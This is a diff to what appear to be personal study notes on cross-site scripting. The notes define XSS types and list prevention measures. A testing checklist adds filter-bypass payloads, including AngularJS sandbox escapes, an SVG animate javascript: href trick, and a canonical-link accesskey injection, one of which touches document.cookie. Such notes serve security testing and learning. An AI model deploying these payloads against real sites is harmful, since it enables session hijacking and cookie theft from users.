@@ -4,25 +4,44 @@
 - Cross-Site Scripting (XSS) is a web security vulnerability that allows attackers to inject malicious scripts into web pages viewed by other users. These scripts are typically written in JavaScript and can be used to manipulate content, steal sensitive information such as cookies and session tokens, hijack user sessions, deface websites, redirect users to malicious sites, or perform actions on behalf of the user without their consent.
 - XSS occurs when an application takes untrusted input—like form fields, URLs, or comments—and renders it in a web page without proper sanitization or escaping, allowing the attacker’s script to execute in the victim’s browser.
 - To prevent XSS, output should be escaped based on its context (HTML, JavaScript, URL), input should be sanitized using libraries like DOMPurify, and a Content Security Policy (CSP) should be implemented to restrict script execution. Unsafe DOM methods like innerHTML should be avoided, and modern frameworks such as React or Angular, which automatically handle output encoding, should be used.
-- Types of XSS:
-    - Stored XSS (Persistent): The malicious script is stored on the server (e.g., in comments or user profiles) and served to users later.
-    - Reflected XSS: The script is embedded in a URL or request and immediately reflected in the response, often in error messages or search results.
-    - DOM-based XSS: The vulnerability exists in client-side JavaScript that processes data from the browser without proper sanitization.
 
-- Three main types of XSS attacks:
-    - Reflected XSS, where the malicious script comes from the current HTTP request.
+Types of XSS Attacks:
+- Reflected XSS:
+    - Reflected cross-site scripting (or XSS) arises when an application receives data in an HTTP request and includes that data within the immediate response in an unsafe way.
+    - The script is embedded in a URL or request and immediately reflected in the response, often in error messages or search results.
     - Stored XSS, where the malicious script comes from the website's database.
+- Stored XSS (Persistent):
+    - Stored cross-site scripting (also known as second-order or persistent XSS) arises when an application receives data from an untrusted source and includes that data within its later HTTP responses in an unsafe way.
+    - The malicious script is stored on the server (e.g., in comments or user profiles) and served to users later.
+    - Reflected XSS, where the malicious script comes from the current HTTP request.
+- DOM-based XSS:
+    - DOM-based XSS vulnerabilities usually arise when JavaScript takes data from an attacker-controllable source, such as the URL, and passes it to a sink that supports dynamic code execution, such as eval() or innerHTML. This enables attackers to execute malicious JavaScript, which typically allows them to hijack other users' accounts.
+    - The vulnerability exists in client-side JavaScript that processes data from the browser without proper sanitization.
     - DOM-based XSS, where the vulnerability exists in client-side code rather than server-side code.
-- To mitigate XSS attacks, always validate and sanitize user inputs, and use context-aware output encoding (HTML, JS, CSS, etc.). Implement a strong Content Security Policy (CSP) to restrict script sources, and set security headers like HttpOnly, Secure, and optionally X-XSS-Protection. Avoid inline JavaScript, use secure frameworks that auto-escape output, and perform regular security testing to detect vulnerabilities early.
+
+- Prevent XSS Attacks:
+    - Preventing cross-site scripting is trivial in some cases but can be much harder depending on the complexity of the application and the ways it handles user-controllable data.
+    - To mitigate XSS attacks, always validate and sanitize user inputs, and use context-aware output encoding (HTML, JS, CSS, etc.). Implement a strong Content Security Policy (CSP) to restrict script sources, and set security headers like HttpOnly, Secure, and optionally X-XSS-Protection. Avoid inline JavaScript, use secure frameworks that auto-escape output, and perform regular security testing to detect vulnerabilities early.
+    - Filter input on arrival: At the point where user input is received, filter as strictly as possible based on what is expected or valid input.
+    - Encode data on output: At the point where user-controllable data is output in HTTP responses, encode the output to prevent it from being interpreted as active content. Depending on the output context, this might require applying combinations of HTML, URL, JavaScript, and CSS encoding.
+    - Use appropriate response headers: To prevent XSS in HTTP responses that aren't intended to contain any HTML or JavaScript, you can use the Content-Type and X-Content-Type-Options headers to ensure that browsers interpret the responses in the way you intend.
+    - Content Security Policy: As a last line of defense, you can use Content Security Policy (CSP) to reduce the severity of any XSS vulnerabilities that still occur.
 
 Test/Check:
 - Reflected:
+    - Test every entry point, Submit random alphanumeric values, Determine the reflection context, Test a candidate payload, Test alternative payloads
     - Study JS, JQuery code by inspecting, Check for input validation and sanitization
+    - Line and string breaks with comments, close previous tags/query
     - Burp Intruder with testing all allowed tags and events
     - <script>alert(1)</script>
     - javascript:alert(1)
+    - Evaluate in backticks: `${alert(1)}`
     - <svg><animatetransform onbegin=alert(1)>
     - Validation skip/bypass: \"-alert(1)}//
+    - Cononical Link Tag (https://test.com/?%27accesskey=%27x%27onclick=%27alert(1)): <link rel="canonical" href="https://test.com/?" accesskey="x" onclick="alert(1)">
+    - Obfuscation with libraries such as AngularJS: [1] | orderBy: toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)
+    - Obfuscation with libraries such as AngularJS: <input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(document.cookie)'>#x'
+    - Blocked Tags and Attributes: <svg><a><animate attributeName="href" values="javascript:alert(1)"></animate><text x="20" y="20">Click me</text></a>'</svg>
 - DOM Based:
     - Test with Elements that support onload/onerror:
         - <script>alert(1)</script>
@@ -35,3 +54,4 @@ Test/Check:
 - Stored:
     - Store payloads on server
     - Custom tags when WAF
+    - Anchor Tag Onclick: http://foo?&apos;-alert(1)-&apos;
